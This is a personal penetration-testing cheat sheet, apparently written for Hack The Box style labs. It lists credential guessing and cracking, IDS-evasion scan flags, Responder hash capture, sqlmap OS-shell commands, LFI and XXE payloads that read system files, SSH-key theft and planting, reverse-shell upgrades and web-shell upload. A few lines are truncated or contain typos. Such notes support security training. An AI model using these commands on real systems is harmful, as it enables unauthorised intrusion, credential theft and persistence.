# Authentication

## General process

1. **Initial guesses**: 
   - Empty authentication (Anonymous login)
   - Default authentication: 
     - Google: *service + default credentials*
     - Web:
       - admin
       - user
     - Linux:
       - root (linux), 
     - Windows:
       - Guest
       - Administrator
   - Password: (*password*, same as username)
   - Password reuse on o
2. **Password Spraying:**

   - Generate passwords with `pswgen`
3. **Brute Forcing**

   - zip files: johnthe ripper, use zip2john to convert it
     - `zip2john backup.zip > backup.hash`
     - `john backup.hash`

**Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)

## Web

1. Type Juggling: 
   - php: loose comparison `==` or `!=` in the authentication method



# Enumeration

## Network

- *Host discovery:* `alive [IP]`

- **Service Scanning**:

  - ```bash
    tcp [IP ADDRESS]
    udp [IP ADDRESS]
    ```

  - Banner grabbing flags:

    - `-sV` 

    - `--version-all`

    - `--version-trace`

    - Traffic intercept:

      ```bash
      sudo tcpdump -i tun0 host [YOUR_IP] and [IP_TO_LISTEN]
      ```

      ```bash
      sudo ncat -v [IP] [PORT] {--source-port }
      ```

  - Firewalls / IDS methods:

    - Change source-port to the most acceted one: `-g 53`
    - Dns-spoofing: `--dns-server 1.1.1.1` `-D RND:5`
    - Change scanning protocol: `-sS` `-sT` `-sA`
    - Decrease time `-T2` if the host is going in time-out
    - IP-ID manipulation `-S [YOUR_IP]` `-e [YOUR_INTERFACE]`

- **SNMP**

- `nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`

  ## Protocols:

- **RDP** 3389: `xfreerdp` 

- **WINRM** 5985: NTLM authentication

  - ```bash
    sudo responder -I tun0 -w -d 
    ```

  - ```bash
    john -w=/usr/share/wordlists/rockyou.txt hash.txt
    ```

- **MySQL** `mysql -h {IP} -u root`

- **REDIS** `redis-cli -h {IP}`

  -  `info` return information about the  server

  - `Server` info: get version of redis
  - `Keyspace` list of dictionaries (dictionaries) with statistics: number of keys, number of keys with expiration
  - `select {index number of the database}`
  - `keys *` List all the keys in the database
  - `get {key}`

- **msSQL** 1433

  -  `mssqlclient.py [[domain/]username[:password]@]<targetName or address> -windows-auth`

- **FTP** 21 `ftp`

- **SMB** 445

  - `smbclient\\\\{ip}\\{share}`
  - `smbclient -N -L \\\\[IP ADDRESS]`
  -  `cd`, `ls`, and to download a file `mget`.
  - `psexec` to open a shell

- **RSyinc**

  - To read: `rsync -av --list-only rsync://{HOST}/`

  - To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`

- **TFTP UDP 69**

- `tftp [IP]`


## Web

- General Info:

  - ```bash
    web_enum {URL}
    ```

  - SSL/TLS Certificates (phishing)

  - `{URL}/robots.txt`

  - page content

  - source code `CRTL + U`

    - `!--` comments
    - Domains, emails (to add in `/etc/hosts`)
    - Native JS code (`<script`)
    - Meta-Tags (`<meta`), Versions (`1-9.`), Components

- Directories / files: 

  ```bash
  filefuzz {URL}
  dirfuzz {URL}
  ```

- DNS Subdomains:

  ```bash
  gobuster dns -d {URL} -w /usr/share/secLists/Discovery/DNS/{WORDLIST}
  ```

  

# Exploit

### Public Exploits: 

- `searchsploit` + Sploitus

- google

  - `[service_string] [action_to_perform] exploit poc cve github`

- Metasploit:

  - `msfconsole`

  ```bash
  	> search exploit {exploit_found_with_searchsploit}
  	> show options {exploit}
  	> use {exploit}
  ```



## Network

## Web

### Proxy

- Host Mirrouting

  ```bash
  gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
  ```

### Server-Side

- SQL Injection

  - Confirm the vulnerability

    ```bash
    sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs --level=5 --risk=3 --flush-session {--cookie=['COOKIE'] --dbms=[DATABASE]}```  
    ```

  - To run code execution

    ```bash
    sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs {--cookie=['COOKIE'] --dbms=[DATABASE]}--os-shell
    ```

- LFI / RFI

  - ```bash
    page=../../../../../../../../windows/system32/drivers/etc/hosts
    ```

- SSTI

  - ![image-20240922190834802](/home/damuna/.config/Typora/typora-user-images/image-20240922190834802.png)

- XXE Injections:

  ```php
  <!--?xml version="1.0" ?-->
  <!DOCTYPE foo [<!ENTITY example SYSTEM "FILE"> ]>
  <data>&example;</data>
  ```
  
  - FILE:
    - Linux: `"/etc/passwd"`
    - Windows file: `'file"///c:/windows/win.ini'`
  - data: vulnerable parameter, the *reflected* one.
  
  

# Privilege Escalation

## Linux

- Users `cat /etc/passwd | grep sh` and `ls  /home`

- User Group:

  -  `id` and what can that group do
  - [interesting_groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe)

- User Privileges:

  - `sudo -l` sudo privileges
  - `find / -perm -u=s -type f 2>/dev/null`: checks for *SUID binaries* 
  - search on [gtfobins](https://gtfobins.github.ioh) bin files with relative privileges

- Readable / Owned web files (for web application)

  - `find /var/www -type f -group [group] 2>/dev/null`  

  - `find /var/www -type f -user [user] 2>/dev/null`

  - `find /var/www -type f -readable 2>/dev/null`

  - Scheduled Tasks:

    - `/etc/crontab`
    - `/etc/cron.d`
    - `/var/spool/cron/crontabs/root`

  - SSH keys:  

    - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`

      ```bash
      $ chmod 600 id_rsa	# More restrictive permission
      $ ssh root@10.10.10.10 -i id_rsa
      $ nano id_rsa	# open and copy on your machine
      ```

    - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`

      ```bash
      ssh-keygen -f key	#Generate a key in the output file key
      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
      ssh root@10.10.10.10 -i key	# Login
      ```

      

- Local Network Services

  - `netstat -puntal` or `ss -puntal` (access/ tunnel)

- Local Processes

  - `ps -aux | grep [USER, ROOT...]`
  - `ps -aux` look for local databases

- Kernel Exploits

- Vulnerable Software: `dpkg -l` 

## Windows

- Users `whoami`

- User Group:

  -  `id` and what can that group do
  -  [interesting_groups](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)

- User Privileges: `whoami \priv`

  Search them on [win_privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

- Readable / Owned web files (for web application)

  - SSH keys:  

    - Read: copy it from `file:///c:/users/[USERNAME]/.ssh/id_rsa`

      ```bash
      $ chmod 600 id_rsa	# More restrictive permission
      $ ssh root@10.10.10.10 -i id_rsa
      $ nano id_rsa	# open and copy on your machine
      ```

    - Write: place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`

      ```bash
      ssh-keygen -f key	#Generate a key in the output file key
      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
      ssh root@10.10.10.10 -i key	# Login
      ```

    

- Local Network Services




- Local Processes
- Kernel Exploits
- Vulnerable Software:  `C:\Program Files` in Windows

# Shells

## Reverse Shell

- [ReverseShellGenerator](https://www.revshells.com/)
  
  - **php ** PentestMonkey
  - **Windows:** PowerShell #3 in Base64
  
- **TTY Upgrade**:

  - script method

    ```bash
    script -qc /bin/bash /dev/null
    ```

  - python/stty method

  ```bash
  # In reverse shell
  $ python -c 'import pty; pty.spawn("/bin/bash")'	#usually good enough
  Ctrl-Z	# Go to my Kali
  
  # In Kali
  $ stty raw -echo
  $ fg	# Go to shell
  
  # In reverse shell
  $ reset
  $ export SHELL=bash
  $ export TERM=xterm-256color
  $ stty rows [] columns []
  ```

  

## Web Shell

- Write the shell in the appropriate language

- Upload it in the web root

  | Web Server | Default Webroot        |
  | ---------- | ---------------------- |
  | `Apache`   | /var/www/html/         |
  | `Nginx`    | /usr/local/nginx/html/ |
  | `IIS`      | c:\inetpub\wwwroot\    |
  | `XAMPP`    | C:\xampp\htdocs\       |

- Access with curl

  ```curl http://SERVER_IP:PORT/shell.php?cmd=id```
  
- `/usr/share/webshells/`



# General Knowledge
